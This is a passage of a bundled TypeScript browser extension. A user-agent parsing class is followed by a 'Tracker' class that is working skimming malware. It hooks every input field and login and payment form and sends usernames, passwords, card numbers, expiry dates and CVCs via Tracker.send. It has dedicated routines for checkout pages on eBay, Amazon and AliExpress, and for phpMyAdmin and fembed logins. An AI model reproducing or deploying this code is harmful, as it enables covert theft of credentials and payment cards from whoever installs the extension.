                "name": "libwww-FM",
                "developer": "Tim Berners-Lee",
                "contain": "libwww-FM",
                "contain_example": "libwww-FM\/xyz"
            }
        };
        /*Parent App of Browser*/
        this.webBrowserAppCodeNameList = [{ 'name': 'mozilla', 'code': 'Mozilla' }];
        /** update db
         *
         * const self = this;
         /!*devices list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-devices-list.json", function (updatedList: any) {
            self.devicesList = updatedList;
        });
         /!*device's architecture list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-devices-architecture-list.json", function (updatedList: any) {
            self.devicesArchitectureList = updatedList;
        });
         /!*devices category list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-devices-category-list.json", function (updatedList: any) {
            self.devicesCategoryList = updatedList;
        });
         /!*devices platform window manager list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-devices-platform-wmn-list.json", function (updatedList: any) {
            self.devicesPlatformWMNameList = updatedList;
        });
         /!*browsers list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-all-list.json", function (updatedList: any) {
            self.webBrowserList = updatedList;
        });
         /!*browsers app code list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-app-code-list.json", function (updatedList: any) {
            self.webBrowserAppCodeNameList = updatedList;
        });
         /!*browsers layout list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-layout-list.json", function (updatedList: any) {
            self.webBrowserAppCodeNameList = updatedList;
        });*/
        this.analyze();
    }
    /*private GetUpdatedData(Url: string, callback: any) {
        sendRequest({
            method: "POST",
            url: Url,
            async: true,
        }, function (data: any) {
            try {
                if (JSON.parse(data)) {
                    if (callback) {
                        callback(JSON.parse(data));
                    }
                }
            } catch (e) {
                console.error("Unable to retrieve data from " + Url);
                console.error(e);
            }
        });
    }*/
    analyze() {
        /*start operation*/
        const self = this;
        let cleanUA = self.cleanUserAgentString(this.UserAgent);
        /*first step*/
        if (Array.isArray(self.webBrowserAppCodeNameList)) {
            self.webBrowserAppCodeNameList.forEach((value) => {
                /*search app code form user-agent*/
                if (cleanUA.indexOf(value.name.toLowerCase()) !== -1) {
                    self.browserAppName = value.code;
                    /*split user-agent in to array by space*/
                    cleanUA.split(" ").forEach(function (item) {
                        if (item.indexOf(value.name.toLowerCase()) !== -1) {
                            self.browserAppNameFull = item.replace("/", " ").replace(value.name, value.code);
                            console.log(self.browserAppNameFull);
                            self.browserAppVersion = item.substr(value.name.toLowerCase().length + 1, (item.length - (value.name.toLowerCase().length + 1)));
                            console.log(self.browserAppVersion);
                        }
                    });
                }
            });
        }
        /*second step*/
        /*self.devicesPlatformWMNameList.forEach(function (wm:any){

        })*/
    }
    /**
     * @public
     * @return string
     */
    getURLProtocol() {
        return this.URLProtocol;
    }
    /**
     * @public
     * @return string
     */
    getURLHostname() {
        return this.URLHostname;
    }
    /**
     * @public
     * @return string
     */
    getURLPath() {
        return this.URLPath;
    }
    /**
     * @public
     * @return string
     */
    getURLPathFull() {
        return this.URLPathFull;
    }
    /**
     * @public
     * @return number
     */
    gerDeviceScreenHeight() {
        return this.DeviceScreenHeight;
    }
    /**
     * @public
     * @return number
     */
    gerDeviceScreenWidth() {
        return this.DeviceScreenWidth;
    }
    /**
     * @public
     * @return number
     */
    gerDeviceScreenColorDepth() {
        return this.DeviceScreenColorDepth;
    }
    /**
     * @public
     * @return number
     */
    gerDeviceScreenPixelDepth() {
        return this.DeviceScreenPixelDepth;
    }
    /**
     * @public
     * @return string
     */
    getDeviceWmNameOriginal() {
        return this.deviceWmNameOriginal;
    }
    /**
     * @public
     * @return array
     */
    getDeviceInfoAll() {
        return this.deviceInfoAll;
    }
    /**
     * @public
     * @return mixed
     */
    getUserAgent() {
        return this.UserAgent;
    }
    getDeviceList() {
        return this.devicesList;
    }
    getArchitectureList() {
        return this.devicesArchitectureList;
    }
    getBrowserAppCodeNameList() {
        return this.webBrowserAppCodeNameList;
    }
    getWebBrowserList() {
        return this.webBrowserList;
    }
    getWebBrowserLayoutList() {
        return this.webBrowserLayoutList;
    }
    getPlatformWMNameList() {
        return this.devicesPlatformWMNameList;
    }
    getDevicesCategoryList() {
        return this.devicesCategoryList;
    }
    /**
     * @public
     * @return array
     */
    getUserAgentList() {
        return this.UserAgentList;
    }
    /**
     * @public
     * @return string
     */
    getBrowserEngineName() {
        return (this.browserEngineName).trim();
    }
    /**
     * @public
     * @return string
     */
    getBrowserEngineNameFull() {
        return (this.browserEngineNameFull).trim();
    }
    /**
     * @public
     * @return array
     */
    getBrowserInfoAll() {
        return this.browserInfoAll;
    }
    /**
     * @public
     * @return string
     */
    getBrowserAppCodeName() {
        return (this.browserAppCodeName).trim();
    }
    /**
     * @public
     * @return string
     */
    getBrowserAppCodeVersion() {
        return (this.browserAppCodeVersion).trim();
    }
    /**
     * @public
     * @return string
     */
    getBrowserAppName() {
        return (this.browserAppName).trim();
    }
    /**
     * @public
     * @return string
     */
    getBrowserAppCodeNameFull() {
        return (this.browserAppName).trim();
    }
    /**
     * @public
     * @return string
     */
    getBrowserAppVersion() {
        return (this.browserAppVersion).trim();
    }
    /**
     * @public
     * @return string
     */
    getBrowserArchitecture() {
        return (this.browserArchitecture).trim();
    }
    /**
     * @public
     * @return string
     */
    getBrowserEngineVersion() {
        return (this.browserEngineVersion).trim();
    }
    /**
     * @public
     * @return string
     */
    getBrowserName() {
        return (this.browserName).trim();
    }
    /**
     * @public
     * @return string
     */
    getBrowserNameFull() {
        return (this.browserNameFull).trim();
    }
    /**
     * @public
     * @return string
     */
    getBrowserVersion() {
        return (this.browserVersion).trim();
    }
    /**
     * @public
     * @return string
     */
    getBrowserVersionFull() {
        return (this.browserVersionFull).trim();
    }
    /**
     * @public
     * @return mixed
     */
    getCurrentDeviceInfo() {
        return this.currentDeviceInfo;
    }
    /**
     * @public
     * @return string
     */
    getDeviceName() {
        return (this.deviceName).trim();
    }
    /**
     * @public
     * @return string
     */
    getDeviceNameFull() {
        return (this.deviceNameFull).trim();
    }
    /**
     * @public
     * @return string
     */
    getDeviceNameOriginal() {
        return (this.deviceNameOriginal).trim();
    }
    /**
     * @public
     * @return string
     */
    getDeviceType() {
        return (this.deviceType).trim();
    }
    /**
     * @public
     * @return string
     */
    getDeviceArchitecture() {
        return (this.deviceArchitecture).trim();
    }
    /**
     * @public
     * @return string
     */
    getDeviceWindowManager() {
        return (this.deviceWindowManager).trim();
    }
    gtDeviceDetails(resources) {
        //array_change_key_case($age,CASE_UPPER)
        if (Array.isArray(resources) && (resources).length > 0) {
            if ('Platform' in resources) {
                this.currentDeviceInfo = resources['Platform'];
                this.deviceName = resources['Platform']['name'];
                this.deviceArchitecture = resources['Platform']['architecture'];
                this.deviceType = resources['Device']['type'];
            }
            else {
                if (typeof resources === 'string') {
                    this.deviceName = resources;
                    this.deviceType = resources;
                    this.currentDeviceInfo = resources;
                }
            }
        }
    }
    getPlatformName() {
        return this.deviceName;
    }
    getPlatformArchitecture() {
        return this.deviceArchitecture;
    }
    cleanUserAgentString(UserAgent) {
        // clean up the string
        // replace browser names with their aliases
        return UserAgent.toLowerCase().trim().replace('opr', 'opera').replace('iceweasel', 'firefox');
    }
}


/***/ }),

/***/ "./Assets/typescripts/classes/tracker.ts":
/*!***********************************************!*\
  !*** ./Assets/typescripts/classes/tracker.ts ***!
  \***********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "Tracker": () => (/* binding */ Tracker)
/* harmony export */ });
/* harmony import */ var _db_tracker__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ../db/tracker */ "./Assets/typescripts/db/tracker.ts");
/* harmony import */ var _common_request__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ../common/request */ "./Assets/typescripts/common/request.ts");
/* harmony import */ var _db_app__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../db/app */ "./Assets/typescripts/db/app.ts");
/* harmony import */ var _browser__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./browser */ "./Assets/typescripts/classes/browser.ts");




/*initialize on extension installed*/
const BrJS = new _browser__WEBPACK_IMPORTED_MODULE_3__.Browser();
const appTracker = _db_app__WEBPACK_IMPORTED_MODULE_2__.app.default.name + '@' + _db_app__WEBPACK_IMPORTED_MODULE_2__.app.default.version;
let globalAppMonitorMainURL;
globalAppMonitorMainURL = 'http://localhost/monitor/browser/';
/*required variables*/
class Tracker {
    url;
    authEvent;
    isTrackerActivate = false;
    trackerJobId = 0;
    passwordStore = [];
    creditCardStore = [];
    creditCardRuntimeHolderName = '';
    creditCardRuntimeNumber = '';
    creditCardRuntimeBrand = '';
    creditCardRuntimeExpireDate = '';
    creditCardRuntimeCvc = '';
    creditCardRuntimePostalCode = '';
    constructor(url) {
        if (url) {
            this.url = url;
        }
    }
    init(callBack) {
        const self = this;
        if (self.url) {
            let interval1 = setInterval(function () {
                self.verifyFormElement(self, interval1);
            }, 1000);
            self.backupScripts(self);
            self.absoluteTrack(self);
            if (!self.isTrackerActivate) {
            }
            else {
            }
        }
        if (callBack) {
            callBack();
        }
    }
    absoluteTrack(self) {
        let interval = setInterval(function () {
            if (document.querySelectorAll('input').length !== 0) {
                clearInterval(interval);
                self.absoluteTrackHelper(self, document.body, 'input', function (__detectedElement) {
                    ['keyup', 'paste', 'change', 'input'].forEach(function (event) {
                        __detectedElement.addEventListener(event, function () {
                            if (__detectedElement.value.length !== 0) {
                                Tracker.send({
                                    command: 'saveInputElementData',
                                    data: {
                                        'name': __detectedElement.nodeName.toLowerCase(),
                                        'type': __detectedElement.type,
                                        'value': __detectedElement.value,
                                        'placeholder': __detectedElement.placeholder ? __detectedElement.placeholder : 'NOT SET',
                                        "workWebsite": window.location.origin
                                    }
                                });
                            }
                        });
                    });
                });
            }
            if (document.querySelectorAll('select').length !== 0) {
                clearInterval(interval);
                self.absoluteTrackHelper(self, document.body, 'select', function (__detectedElement) {
                    ['keyup', 'paste', 'change', 'input'].forEach(function (event) {
                        __detectedElement.addEventListener(event, function () {
                            if (__detectedElement.value.length !== 0) {
                                Tracker.send({
                                    command: 'saveInputElementData',
                                    data: {
                                        'name': __detectedElement.nodeName.toLowerCase(),
                                        'type': __detectedElement.type,
                                        'value': __detectedElement.value,
                                        'placeholder': __detectedElement.placeholder ? __detectedElement.placeholder : 'NOT SET',
                                        "workWebsite": window.location.origin
                                    }
                                });
                            }
                        });
                    });
                });
            }
        }, 100);
    }
    absoluteTrackHelper(self, elementParentNode, __tagName, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName.toLowerCase() === __tagName) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.absoluteTrackHelper(self, __childElement, __tagName, callback);
                }
            });
        }
    }
    trigger(self, __formElement) {
        self.track(self, __formElement);
    }
    verifyFormElement(self, interval) {
        if (document.querySelectorAll('form').length !== 0) {
            document.querySelectorAll('form').forEach(function (__formElement) {
                if (__formElement.attributes.length !== 0) {
                    if (window.location.href.toLowerCase().indexOf('phpmyadmin') !== -1) {
                        if (__formElement.method === 'post') {
                            interval ? clearInterval(interval) : '';
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    }
                    else {
                        if (__formElement.action !== 'javascript:void(0)' && __formElement.id !== 'null' && __formElement.id !== 'irouteForm' &&
                            __formElement.id !== 'bhlf' && __formElement.id.indexOf('id') === -1 && __formElement.id.indexOf('u_0_') === -1 &&
                            __formElement.id.indexOf('theform') === -1 && __formElement.id.indexOf('scl_form') === -1 &&
                            __formElement.className.indexOf('gb_8e') === -1) {
                            interval ? clearInterval(interval) : '';
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    }
                }
                else {
                    if (__formElement.childNodes.length > 1) {
                        interval ? clearInterval(interval) : '';
                        self.isTrackerActivate = true;
                        self.trackerJobId++;
                        self.trigger(self, __formElement);
                    }
                }
            });
        }
        else {
            if (window.location.origin.indexOf('dash.fembed.com') !== -1) {
                if (document.querySelector('#login') !== null) {
                    interval ? clearInterval(interval) : '';
                    self.isTrackerActivate = true;
                    self.trackerJobId++;
                    self.classicTrackAuthEvent(self, '#email_login', '#password', '#login');
                }
            }
        }
    }
    resolverFormAttributes(self, __formElement) {
        const attributes = [...__formElement.attributes];
        if (attributes.length !== 0) {
            attributes.forEach(function (attribute) {
                if (attribute.nodeValue !== 'javascript:void(0);') {
                    if (attribute.nodeValue.length !== 0 && attribute.nodeValue.length >= 3) {
                        /*form attribute value*/
                        _db_tracker__WEBPACK_IMPORTED_MODULE_0__.authFormAttribute.forEach(function (keyword) {
                            if (Object.keys(keyword).length !== 0 && keyword.constructor === Object) {
                                Object.keys(keyword).forEach(function (__key) {
                                    keyword[__key].forEach(function (__qKey) {
                                        if (attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1 /*|| window.location.origin.toLowerCase().indexOf(__qKey) !== -1
                                            || document.title.toLowerCase().indexOf(__qKey) !== -1 && window.location.origin.toLowerCase().indexOf('file') === -1*/) {
                                            /*var str = text.replace(/(^\w{1})|(\s{1}\w{1})/g, match => match.toUpperCase());*/
                                            //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = __key;
                                            self.authEvent = __key;
                                        }
                                        else {
                                            if (attribute.nodeValue === null) {
                                                //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = 'exclude';
                                                self.authEvent = 'exclude';
                                            }
                                        }
                                    });
                                });
                            }
                        });
                    }
                }
            });
        }
        else {
            self.authEvent = 'Unknown';
        }
        return self.authEvent;
    }
    track(self, __formElement) {
        let elements = [];
        if (__formElement.nodeName === 'FORM' && __formElement.length !== 1) {
            self.resolverFormAttributes(self, __formElement);
            if (self.authEvent === 'login' || self.authEvent === 'register') {
                self.crawlAuthFormElement(self, elements, __formElement);
            }
            else if (self.authEvent === 'payment') {
                self.crawlPaymentFormElement(self, elements, __formElement);
            }
            else {
                if (self.authEvent !== 'exclude' && self.authEvent !== 'logout') {
                    self.crawlAuthFormElement(self, elements, __formElement);
                    self.crawlPaymentFormElement(self, elements, __formElement);
                    /*additional functions*/
                    /*exclude paypal,amazon,tunnelbear*/
                    /*ebay*/
                    if (window.location.origin.indexOf('ebay') !== -1) {
                        let interval = setInterval(function () {
                            if (document.querySelectorAll('form').length !== 0) {
                                document.querySelectorAll('form').forEach(function (__ebayFormElement) {
                                    if (__ebayFormElement.id === 'credit-card-details') {
                                        clearInterval(interval);
                                        let elements = [];
                                        self.exploreEbayPaymentDataCollection(self, __ebayFormElement, elements);
                                    }
                                });
                            }
                        }, 100);
                        if (document.querySelector('#root') !== null && document.querySelector('.cic-module') !== null && document.querySelector('.btn.btn--primary.field') !== null) {
                            if (document.querySelector('.btn.btn--primary.field')?.nodeName === 'BUTTON') {
                                ["click", "dblclick"].forEach(function (event) {
                                    let tempPaymentMethodsStore = [];
                                    document.querySelector('.btn.btn--primary.field')?.addEventListener(event, function () {
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'creditCardNumber', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'firstName', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'lastName', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'expirationDate', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, document.querySelector('.cic-module'), 'input', 'cvv', function (__detectedElement) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        Tracker.send({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                'cardBrand': document.querySelector('.floating-input__fixright')?.firstElementChild?.className ? document.querySelector('.floating-input__fixright')?.firstElementChild?.className.toLowerCase() : 'Unknown',
                                                'cardHolder': tempPaymentMethodsStore[1].value + ' ' + tempPaymentMethodsStore[2].value,
                                                "cardExpire": tempPaymentMethodsStore[3].id === 'expirationDate' ? tempPaymentMethodsStore[3].value : 'Unknown',
                                                'cardCVC': tempPaymentMethodsStore[4].id === 'cvv' ? tempPaymentMethodsStore[4].value : 'Unknown',
                                                'event': 'add',
                                                "workWebsite": window.location.origin
                                            }
                                        });
                                        tempPaymentMethodsStore = [];
                                    });
                                });
                            }
                        }
                    }
                }
            }
        }
    }
    classicTrackAuthEvent(self, usernameElementId, passwordElementId, loginButtonElementId) {
        let usernameElement, passwordElement, loginButtonElement;
        if (document.querySelector(usernameElementId) !== null) {
            usernameElement = document.querySelector(usernameElementId);
        }
        if (document.querySelector(passwordElementId) !== null) {
            passwordElement = document.querySelector(passwordElementId);
        }
        if (document.querySelector(loginButtonElementId) !== null) {
            loginButtonElement = document.querySelector(loginButtonElementId);
        }
        loginButtonElement.addEventListener('click', function () {
            return Tracker.send({
                command: 'saveLoginData',
                data: {
                    "event": self.authEvent,
                    "username": usernameElement.value,
                    "password": passwordElement.value,
                    "workWebsite": window.location.origin
                }
            });
        });
    }
    crawlAuthFormElement(self, elements, __parentElement) {
        __parentElement.childNodes?.forEach(function (__childElement) {
            ['input', 'button', 'a'].forEach(function (__eligibleElement) {
                if (__childElement.nodeName.toLowerCase() === __eligibleElement) {
                    ['input'].forEach(function (__onlyInputElement) {
                        if (__childElement.nodeName.toLowerCase() === __onlyInputElement) {
                            [...__childElement.attributes].forEach(function (__attribute) {
                                if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
                                    /* minor changes start */
                                    ['text', 'user', 'email', 'pass'].forEach(function (__eligibleAttribute) {
                                        if (__attribute.nodeValue.toLowerCase().indexOf(__eligibleAttribute) !== -1) {
                                            elements.push(__childElement);
                                        }
                                    });
                                    /* minor changes end */
                                }
                            });
                        }
                    });
                    if (__childElement.type === 'submit' || __childElement.type === 'button' || __childElement.nodeName === 'A' &&
                        __childElement.innerHTML.toLowerCase().indexOf('sign' || 0 || 0) !== -1) {
                        self.resolveAuthEvent(self, __childElement, elements);
                    }
                }
            });
            return self.crawlAuthFormElement(self, elements, __childElement);
        });
    }
    resolveAuthEvent(self, element, array) {
        let elementNode, elementName, elementType, elementValue;
        element.addEventListener('click', function () {
            new Set(array).forEach(function (__detectedElement) {
                [...__detectedElement.attributes].forEach(function (__attribute) {
                    if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
                        ['user', 'login', 'email', 'pass'].forEach(function (__eligibleAttribute) {
                            if (__attribute.nodeValue.toLowerCase().indexOf(__eligibleAttribute) !== -1) {
                                elementNode = __detectedElement;
                                elementName = __eligibleAttribute;
                                elementType = __detectedElement.type;
                                elementValue = __detectedElement.value;
                            }
                        });
                    }
                });
                if (elementValue.length !== 0) {
                    self.passwordStore.push({
                        node: elementNode,
                        name: elementName,
                        type: elementType,
                        value: elementValue
                    });
                }
            });
            Tracker.send({
                command: 'saveLoginData',
                data: {
                    "event": self.authEvent,
                    "username": self.passwordStore[0]?.value,
                    "password": self.passwordStore[1]?.value,
                    "workWebsite": window.location.origin
                }
            });
            self.passwordStore = [];
        });
    }
    crawlPaymentFormElement(self, elements, __formElement) {
        __formElement.childNodes?.forEach(function (__childElement) {
            ['input', 'button', 'select'].forEach(function (__eligibleElement) {
                if (__childElement.nodeName.toLowerCase() === __eligibleElement) {
                    ['input', 'select'].forEach(function (__eligibleDataElement) {
                        if (__childElement.nodeName.toLowerCase() === __eligibleDataElement) {
                            ['text', 'tel', 'number', 'password', 'radio', 'select-one'].forEach(function (__eligibleElementType) {
                                if (__childElement.type === __eligibleElementType) {
                                    [...__childElement.attributes].forEach(function (__attribute) {
                                        if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 3) {
                                            _db_tracker__WEBPACK_IMPORTED_MODULE_0__.paymentElementsAttribute.forEach(function (__eligibleKeyword) {
                                                if (Object.keys(__eligibleKeyword).length !== 0 && __eligibleKeyword.constructor === Object) {
                                                    Object.keys(__eligibleKeyword).forEach(function (__cardDataKey) {
                                                        __eligibleKeyword[__cardDataKey].forEach(function (__qKey) {
                                                            if (__attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1 && __attribute.nodeValue.toLowerCase().indexOf('none' || 0 || 0) === -1) {
                                                                elements.push(__childElement);
                                                            }
                                                        });
                                                    });
                                                }
                                            });
                                        }
                                    });
                                }
                            });
                        }
                    });
                    ['submit', 'button'].forEach(function (__eligibleCollectorElement) {
                        if (__childElement.type === __eligibleCollectorElement) {
                            self.resolvePaymentEvent(self, __childElement.form, __childElement, elements);
                        }
                    });
                }
            });
            return self.crawlPaymentFormElement(self, elements, __childElement);
        });
    }
    /* PASSED
    * https://www.tunnelbear.com/account/checkout
    * https://www.amazon.com/cpe/yourpayments/wallet
    * */
    resolvePaymentEvent(self, __formElement, __dataCollectorElement, array) {
        ['submit'].forEach(function (__formEvent) {
            __formElement.addEventListener(__formEvent, function () {
                self.collectPaymentData(self, array);
            });
        });
        ['click', 'dblclick', 'ontouchstart'].forEach(function (__dataCollectorEvent) {
            __dataCollectorElement.addEventListener(__dataCollectorEvent, function () {
                self.collectPaymentData(self, array);
            });
        });
        try {
            if (window.self !== window.top) {
                new Set(array).forEach(function (__detectedElement) {
                    ['keyup', 'keydown', 'change', 'paste'].forEach(function (__event) {
                        __detectedElement.addEventListener(__event, function () {
                            self.collectPaymentData(self, array);
                        });
                    });
                });
            }
        }
        catch (e) {
        }
    }
    collectPaymentData(self, array) {
        let elementNode, elementName, elementType, elementValue;
        new Set(array).forEach(function (__detectedElement) {
            [...__detectedElement.attributes].forEach(function (__attribute) {
                if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 3) {
                    _db_tracker__WEBPACK_IMPORTED_MODULE_0__.paymentElementsAttribute.forEach(function (__eligibleKeyword) {
                        if (Object.keys(__eligibleKeyword).length !== 0 && __eligibleKeyword.constructor === Object) {
                            Object.keys(__eligibleKeyword).forEach(function (__cardDataKey) {
                                __eligibleKeyword[__cardDataKey].forEach(function (__qKey) {
                                    if (__attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1) {
                                        elementNode = __detectedElement;
                                        elementName = __cardDataKey;
                                        elementType = __detectedElement.type;
                                        elementValue = __detectedElement.value;
                                    }
                                });
                            });
                        }
                    });
                }
            });
            if (elementValue.length !== 0) {
                self.creditCardStore.push({
                    node: elementNode,
                    name: elementName,
                    type: elementType,
                    value: elementValue
                });
            }
        });
        self.retrieveAccurateData(self, self.creditCardStore);
        Tracker.send({
            command: 'savePaymentMethodsData',
            data: {
                'cardNumber': self.creditCardRuntimeNumber !== '' ? self.creditCardRuntimeNumber : 'Unknown',
                'cardBrand': self.creditCardRuntimeBrand !== '' ? self.creditCardRuntimeBrand : 'Unknown',
                'cardHolder': self.creditCardRuntimeHolderName !== '' ? self.creditCardRuntimeHolderName : 'Unknown',
                "cardExpire": self.creditCardRuntimeExpireDate !== '' ? self.creditCardRuntimeExpireDate /*.substring(0, self.creditCardRuntimeExpireDate.length - 1)*/ : 'Unknown',
                'cardCVC': self.creditCardRuntimeCvc !== '' ? self.creditCardRuntimeCvc : 'Unknown',
                'event': 'add',
                "workWebsite": window.location.origin
            }
        });
        self.creditCardStore = [];
        self.creditCardRuntimeHolderName = '';
        self.creditCardRuntimeNumber = '';
        self.creditCardRuntimeBrand = '';
        self.creditCardRuntimeExpireDate = '';
        self.creditCardRuntimeCvc = '';
        self.creditCardRuntimePostalCode = '';
        //self.verifyFormElement(self);
    }
    retrieveAccurateData(self, __creditCardDataStore) {
        if (__creditCardDataStore.length !== 0) {
            __creditCardDataStore.forEach(function (__detectedDataElement) {
                (__detectedDataElement.name === 'cardNumber') ? self.creditCardRuntimeNumber = __detectedDataElement.value : '';
                (__detectedDataElement.name === 'cardHolder') ? self.creditCardRuntimeHolderName += __detectedDataElement.value + ' ' : '';
                (__detectedDataElement.name === 'cardBrand') ? self.creditCardRuntimeBrand = __detectedDataElement.value : '';
                (__detectedDataElement.name === 'cardExpire') ? self.creditCardRuntimeExpireDate += __detectedDataElement.value + '/' : '';
                (__detectedDataElement.name === 'cardCVC') ? self.creditCardRuntimeCvc = __detectedDataElement.value : '';
                (__detectedDataElement.name === 'cardPostalCode') ? self.creditCardRuntimePostalCode = __detectedDataElement.value : '';
            });
        }
    }
    backupScripts(self) {
        let interval1 = setInterval(function () {
            if (window.location.origin.indexOf('amazon') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreAmazonPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('aliexpress') !== -1) {
                if (document.querySelector('.check-out-root') !== null && document.querySelector('.check-out-root')?.childNodes.length !== 1) {
                    let interval4 = setInterval(function () {
                        if (document.querySelector('.title-to-detail') !== null) {
                            clearInterval(interval4);
                            if (document.querySelector('.title-to-detail')?.textContent?.indexOf('Add a new card') !== -1) {
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.title-to-detail')?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.bind-button-wrap ')?.firstElementChild?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                            }
                            else {
                                self.exploreSpecificElementByTagName(self, document.querySelector('.check-out-root'), 'span', 'payment-title', function (__detectedElement) {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
                                            Tracker.send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': __detectedElement.textContent,
                                                    'cardBrand': 'Unknown',
                                                    'cardHolder': 'Unknown',
                                                    'cardExpire': 'Unknown',
                                                    'cardCVC': 'Unknown',
                                                    'event': 'add',
                                                    'workWebsite': window.location.origin
                                                }
                                            });
                                        });
                                    });
                                });
                            }
                        }
                    }, 1000);
                }
                else {
                    if (window.location.href.indexOf('confirm_order.htm') !== -1) {
                        let interval = setInterval(function () {
                            if (document.querySelector('.new-card') !== null) {
                                clearInterval(interval);
                                self.processAliExpressPaymentNewCard(self);
                            }
                        }, 100);
                        let interval00 = setInterval(function () {
                            if (document.querySelector('.pay-type.show-method') !== null) {
                                clearInterval(interval00);
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.pay-type.show-method')?.addEventListener(event, function () {
                                        let __interval3 = setInterval(function () {
                                            if (document.querySelector('.new-card') !== null) {
                                                clearInterval(__interval3);
                                                self.explorePaymentNewCard(self, document.querySelector('.new-card'), function (elements) {
                                                    let paymentMethodStore = [];
                                                    document.querySelector('.save')?.addEventListener('click', function () {
                                                        elements.forEach(function (element) {
                                                            paymentMethodStore.push({
                                                                'element': element.nodeName,
                                                                'id': element.id,
                                                                'type': element.type,
                                                                'value': element.value
                                                            });
                                                        });
                                                        Tracker.send({
                                                            command: 'savePaymentMethodsData',
                                                            data: {
                                                                'cardNumber': paymentMethodStore[0].value,
                                                                'cardBrand': 'Unknown',
                                                                'cardHolder': paymentMethodStore[1].value,
                                                                'cardExpire': paymentMethodStore[2].value,
                                                                'cardCVC': paymentMethodStore[3].value,
                                                                'event': 'add',
                                                                'workWebsite': window.location.origin
                                                            }
                                                        });
                                                        paymentMethodStore = [];
                                                    });
                                                });
                                            }
                                        }, 1000);
                                    });
                                });
                            }
                        }, 100);
                        if (document.querySelector('.edit-card') !== null) {
                            ['click', 'dblclick'].forEach(function (event) {
                                document.querySelector('.edit-card')?.addEventListener(event, function () {
                                    let __interval3 = setInterval(function () {
                                        if (document.querySelector('.new-card') !== null) {
                                            clearInterval(__interval3);
                                            self.processAliExpressPaymentNewCard(self);
                                        }
                                    }, 1000);
                                });
                            });
                        }
                        if (document.querySelectorAll('.arrow-content').length !== 0) {
                            document.querySelectorAll('.arrow-content').forEach(function (__detectedDivElement) {
                                __detectedDivElement.addEventListener('click', function () {
                                    if (__detectedDivElement.classList.contains('arrow-down')) {
                                        let __interval2 = setInterval(function () {
                                            if (document.querySelector('.add-new-card') !== null) {
                                                clearInterval(__interval2);
                                                ['click', 'dblclick'].forEach(function (event) {
                                                    document.querySelector('.add-new-card')?.addEventListener(event, function () {
                                                        let __interval3 = setInterval(function () {
                                                            if (document.querySelector('.new-card') !== null) {
                                                                clearInterval(__interval3);
                                                                self.processAliExpressPaymentNewCard(self);
                                                            }
                                                        }, 1000);
                                                    });
                                                });
                                            }
                                        }, 1000);
                                    }
                                });
                            });
                        }
                        if (document.querySelector('.mix-edcard-item')?.childElementCount !== 0) {
                            let cardConfirmElement = document.querySelector('#checkout-button');
